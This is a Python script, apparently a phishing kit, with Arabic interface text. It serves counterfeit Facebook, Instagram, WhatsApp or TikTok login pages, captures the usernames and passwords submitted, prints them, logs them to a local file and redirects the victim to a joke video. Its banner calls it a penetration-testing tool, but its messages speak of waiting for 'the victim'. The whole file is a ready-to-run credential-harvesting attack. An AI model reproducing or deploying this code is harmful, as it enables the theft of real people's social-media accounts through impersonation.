#!/usr/bin/env python3
import os
import http.server
import socketserver
import urllib.parse
from datetime import datetime

PORT = 8080
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")
LOG_FILE = os.path.join(BASE_DIR, "captured_data.txt")

FUNNY_VIDEO_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

class PhishingHandler(http.server.BaseHTTPRequestHandler):
    selected_platform = "facebook.html"

    def do_GET(self):
        file_path = os.path.join(TEMPLATES_DIR, self.selected_platform)
        if self.path == '/' or self.path == '/index.html':
            file_path = os.path.join(TEMPLATES_DIR, self.selected_platform)
        
        if os.path.exists(file_path):
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=UTF-8")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()
            with open(file_path, "r", encoding="utf-8") as f:
                content = f.read()
            self.wfile.write(content.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        
        platform = parsed_data.get('platform', ['Unknown'])[0]
        username = parsed_data.get('username', ['Unknown'])[0]
        password = parsed_data.get('password', ['Unknown'])[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print("\n" + "="*40)
        print(" [+] تم التقاط بيانات جديدة بنجاح! ")
        print(f" [*] الوقت    : {timestamp}")
        print(f" [*] المنصة   : {platform}")
        print(f" [*] المُدخل  : {username}")
        print(f" [*] كلمة المرور: {password}")
        print("="*40 + "\n")

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] Platform: {platform} | Username: {username} | Password: {password}\n")

        self.send_response(302)
        self.send_header('Location', FUNNY_VIDEO_URL)
        self.end_headers()

def main():
    print("\n===============================")
    print("    أداة اختبار الاختراق الموحدة    ")
    print("===============================")
    print("1. فيسبوك (Facebook)")
    print("2. انستجرام (Instagram)")
    print("3. واتساب (WhatsApp)")
    print("4. تيك توك (TikTok)")
    print("===============================")
    
    choice = input("اختر رقم المنصة التي تريد تشغيلها: ")

    if choice == '1':
        PhishingHandler.selected_platform = "facebook.html"
        print("\n[+] تم اختيار منصة: فيسبوك")
    elif choice == '2':
        PhishingHandler.selected_platform = "instagram.html"
        print("\n[+] تم اختيار منصة: انستجرام")
    elif choice == '3':
        PhishingHandler.selected_platform = "whatsapp.html"
        print("\n[+] تم اختيار منصة: واتساب")
    elif choice == '4':
        PhishingHandler.selected_platform = "tiktok.html"
        print("\n[+] تم اختيار منصة: تيك توك")
    else:
        print("اختيار خاطئ، سيتم تشغيل فيسبوك افتراضياً.")
        PhishingHandler.selected_platform = "facebook.html"

    print(f"[+] الخادم يعمل الآن على الرابط: http://localhost:{PORT}")
    print(f"[+] سيتم حفظ البيانات في الملف: {LOG_FILE}")
    print("[+] بانتظار إدخال الضحية للبيانات...\n")

    with socketserver.TCPServer(("", PORT), PhishingHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[!] تم إيقاف الأداة بواسطة المستخدم.")

if __name__ == "__main__":
    main()
EOF
